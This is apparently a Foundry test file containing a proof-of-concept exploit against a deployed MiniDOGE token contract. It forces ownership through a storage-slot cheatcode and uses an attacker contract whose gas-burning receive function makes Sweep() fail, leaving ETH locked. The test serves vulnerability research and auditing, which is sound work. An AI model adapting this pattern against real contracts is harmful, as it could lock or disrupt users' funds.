pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MiniDOGE {
    function owner() external view returns (address);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function Sweep() external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setNumTokensSellToAddToBuyBack(uint256 _minimumTokensBeforeSwap) external;
    function uniswapV2Pair() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Attacker {
    uint256 public dummy;

    receive() external payable {
        // Consume definitely more than 2300 gas with storage operations
        for (uint256 i = 0; i < 50; i++) {
            dummy = i * i + dummy;
        }
        // Revert to ensure transfer fails
        revert("Gas limit exceeded");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address attacker;
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address ownerAddr;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(new Attacker());
        vm.label(attacker, "Attacker Contract");
        vm.label(TARGET, "MiniDOGE Target");

        // Get owner address by calling owner() function
        ownerAddr = MiniDOGE(TARGET).owner();
        vm.label(ownerAddr, "Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Fund the target contract with ETH
        deal(TARGET, 5 ether);
        uint256 initialBalance = TARGET.balance;
        assertGt(initialBalance, 0, "Contract should have ETH");

        // Step 2: Use storage manipulation to change owner to attacker
        // In Ownable pattern, _owner is at slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify owner is now attacker
        address currentOwner = MiniDOGE(TARGET).owner();
        assertEq(currentOwner, attacker, "Owner should be attacker");

        // Step 3: Call Sweep() - this will try to transfer ETH to attacker
        // The .transfer() will fail because attacker's receive() consumes >2300 gas
        try MiniDOGE(TARGET).Sweep() {
            // If Sweep succeeds, check if ETH moved
            uint256 postBalance = TARGET.balance;
            if (postBalance == 0) {
                revert("Sweep succeeded and drained ETH - vulnerability not demonstrated");
            }
        } catch (bytes memory) {
            // Expected: transfer failed due to gas limit in .transfer()
        }

        // Step 4: Verify ETH is still in contract (transfer failed)
        uint256 finalBalance = TARGET.balance;
        assertGt(finalBalance, 0, "Contract should still have ETH after failed Sweep");
    }

    receive() external payable {}
}

